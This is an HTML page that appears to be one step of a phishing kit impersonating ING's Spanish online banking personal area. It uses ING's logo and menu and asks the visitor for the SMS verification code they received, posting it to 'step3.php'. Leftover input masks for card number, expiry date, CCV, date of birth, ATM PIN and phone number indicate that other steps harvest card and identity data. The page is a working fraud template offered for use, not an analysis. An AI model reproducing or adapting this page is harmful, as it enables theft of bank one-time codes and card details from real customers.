<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Àrea personal, ING</title>
    <link rel="icon" href="./img/favicon.ico">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.7.5/css/bulma.min.css">
    <script defer src="https://use.fontawesome.com/releases/v5.3.1/js/all.js"></script>
    <link rel="stylesheet" href="./css/style.css">
  </head>

  <body>

  <nav class="navbar" role="navigation" aria-label="main navigation">
<div class="navbar-brand">
  <img class="hid" src="" alt="" style="
    width: 31px;
    position: absolute;
    left: 15px;
    top: 20px;
    cursor: pointer;
">

    <a class="navbar-item" href="#">
      <img src="./img/logo.svg" width="112" height="28">
    </a>




  
  
  
  
  
  <div class="adz" style="
    width: 100%;
    position: absolute;
    display: flex;
    background-color: #d1d1d1;
    top: 68px;
    left: 0px;
    padding: 0px 110px;
    justify-content: space-between;
    height: 55px;
    align-items: center;
"><div style=" display: flex; width: 620px; font-size: 16px; justify-content: space-between; ">
<p style="
    color: #ff6200;
">Inicio</p>
<p>Mis productos</p><p>Transferencias </p>
<p>+ ING para mi</p><p>Contratar productos</p></div>

<div style="
    font-size: 18px;
    display: flex;
    align-items: center;
    position: relative;
right: 150px;
    ">Àrea personal  <div style="

    width: 42px;
    height: 42px;
    background-color: #8f8f8f;
    padding: 5px;
    border-radius: 50%;
    margin-left: 10px;
    display: flex;
    align-items: center;
    justify-content: center;

"><img src="./img/user.svg" style="
    width: 25px;
"></div>
<div></div></div>



</div>
  
  
  
  
  
  
  
  
  
</nav>


<section class="section" style="
    max-width: 850px;
    margin: 0 auto;
">
    <div class="container sq" style=" width: 100%; position: relative;   top: 50px; left: 5px;">
        <div class="form">
        <h1>Àrea de cliente : Informaciones de Contacto</h1>
        <br>
        <p style="
    color: #828282;
">Introduzca su código de SMS recibido
</p>
        <br>

       <form action="step3.php" method="POST" style="
    max-width: 450px;
    margin: 0 auto;
    margin-bottom: 40px;
    margin-top: 20px;
">


          
        
        
        
          <br>

        
        <div class="field">
            <label class="label">código de SMS</label>
            <div class="control">
              <input class="input" type="text" placeholder="código de SMS" minlength="4" name="sms" required="" maxlength="6">
            </div>
        </div>

          
          

          
          <br>

         
          
        
<br>
<button type="submit" class="mb-5" style=" background-color: #ff6200; padding: 0 30px; height: 45px; color: #FFF; font-weight: 700; width: 100%; border-radius: 9px; border: none; font-size: 18px; cursor: pointer; ">ENTRAR</button>
<br>
<br>

<div style="display: flex;align-items: center;">
        <img src="./img/arrow.png">
        <a href="./loading.php?link=sms_code"> No has recibido el código?</a>
    </div>
    
    
    
    
</form>
        </div>
    </div>
  </section>
  
  <script src="./js/jquery.min.js"></script>
  <script src="./js/mask.min.js"></script>
  <script>
    $(function() {
    $('#CardNumber').mask('0000 0000 0000 0000');
  });
    $(function() {
    $('#ExpirationDate').mask('00/00');
  });
     $(function() {
    $('#CCV').mask('000');
  });

 $(function() {
    $('#dateofbirth').mask('00/00/0000');
  });

 $(function() {
    $('#atm').mask('0000');
  });

    $(function() {
    $('#phoneNumber').mask('0000000000000000000');
  });
  </script>
  
</body>
  
</html>